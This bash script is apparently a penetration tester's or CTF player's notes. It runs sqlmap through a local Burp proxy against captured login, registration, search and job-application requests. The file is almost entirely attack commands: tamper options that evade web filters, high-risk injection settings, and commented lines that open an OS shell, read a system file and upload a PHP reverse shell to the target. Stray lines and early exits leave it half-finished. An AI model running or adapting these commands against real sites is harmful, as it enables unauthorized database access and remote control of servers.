#!/bin/bash

#Burp proxy
PROXY=http://127.0.0.1:8082
echo "TODO under construction ..."
exit 0

--output-dir=sqlmap.dump

#sqlmap --proxy=$PROXY -v -r login.req --tamper=apostrophemask
#sqlmap --proxy=$PROXY -v -r login.req --tamper="space2comment,apostrophemask,equaltolike"
#sqlmap --proxy=$PROXY -v -r login.req --tamper="base64encode"

sqlmap --proxy=$PROXY -v -r login.req --tamper="apostrophemask,equaltolike,unmagicquotes,space2mysqlblank" -p password --level 5
exit 0

#sqlmap --proxy=$PROXY -v -r login.req --tamper="bluecoat"

#OS shell exploit
#sqlmap --proxy=$PROXY -v -r resumes.req -p search --dbms=mysql --level 5 --risk 3 --no-cast --os-shell
#sqlmap -v -r resumes.req -p search --dbms=mysql --technique=B --level 5 --risk 3 --no-cast --file-read=/etc/hostname --flush-session --threads=10 --ignore-redirects --batch
#sqlmap -v -r resumes.req -p search --dbms=mysql --technique=B --level 5 --risk 3 --no-cast --flush-session --threads=10 --ignore-redirects --file-write=php-reverse-shell.php --file-dest="shell.php"

#register.php
sqlmap --proxy=$PROXY -v -r register.req --dbms=mysql -p username
exit 0

#apply.php
sqlmap -v -r apply.req --dbms=mysql -p job_id --level 3 --risk 2
exit 0

#escapequotes,

#tested
#space2mysqlblank
#space2plus.py
#space2randomblank
